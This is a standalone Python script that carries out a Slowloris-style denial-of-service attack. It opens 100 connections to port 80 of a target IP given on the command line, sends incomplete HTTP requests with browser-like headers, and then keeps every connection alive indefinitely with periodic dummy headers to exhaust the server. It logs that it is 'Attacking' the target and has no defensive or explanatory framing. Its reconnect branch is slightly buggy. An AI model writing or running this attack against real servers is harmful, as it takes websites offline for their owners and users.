import socket
import random
import time
import sys

log_level = 2

def log(text, level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = sys.argv[1]
socket_count = 100
log("Attacking {} with {} sockets.".format(ip, socket_count))

log("Creating sockets...")
for _ in range(socket_count):
    try:
        log("Creating socket nr {}".format(_), level=2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, 80))
    except socket.error:
        break
    list_of_sockets.append(s)

log("Setting up the sockets...")
for s in list_of_sockets:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in regular_headers:
        s.send(bytes("{}\r\n".format(header).encode("utf-8")))

while True:
    log("Sending keep-alive headers...")
    for s in list_of_sockets:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
            list_of_sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, 80))
                for s in list_of_sockets:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    for header in regular_headers:
                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            except socket.error:
                continue

    time.sleep(15)